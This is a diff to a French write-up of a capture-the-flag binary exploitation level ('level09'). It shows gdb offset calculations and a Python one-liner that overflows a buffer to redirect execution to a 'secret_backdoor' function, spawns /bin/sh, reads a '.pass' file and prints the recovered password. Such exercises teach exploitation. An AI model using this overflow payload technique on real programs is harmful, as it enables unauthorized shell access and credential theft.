@@ -84,7 +84,7 @@ Stack level 0, frame at 0x7fffffffe5d0:
  Locals at 0x7fffffffe5c0, Previous frame's sp is 0x7fffffffe5d0
  Saved registers:
   rbp at 0x7fffffffe5c0, rip at 0x7fffffffe5c8
-(gdb) > p 0x7fffffffe5c8 - 0x7fffffffe500 
+(gdb) > p 0x7fffffffe5c8 - 0x7fffffffe500
 $1 = 200
 ```
 
@@ -92,8 +92,13 @@ $1 = 200
 
 Il suffit de rajouter l'adresse de la fonction **secret_backdoor**, un '\n' pour simuler l'entrée d'input, et enfin '/bin/sh' qui sera executé par **system**.
 
+Il suffit donc d'inserer 208 (offset + 8 bytes pour l'adresse) dans notre `unsigned int` de notre structure et d'insérer l'adresse au niveau de l'**eip**.
+
+`\xd0 = 208`
+
+
 ```shell
-(python -c "print 'A' * 40 + '\xff' + '\n' + 'A' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '\n' + '/bin/sh' "; cat) | ./level09
+(python -c "print 'A' * 40 + '\xd0' + '\n' + 'A' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '\n' + '/bin/sh' "; cat) | ./level09
 cat /home/users/end/.pass
 j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
 ```
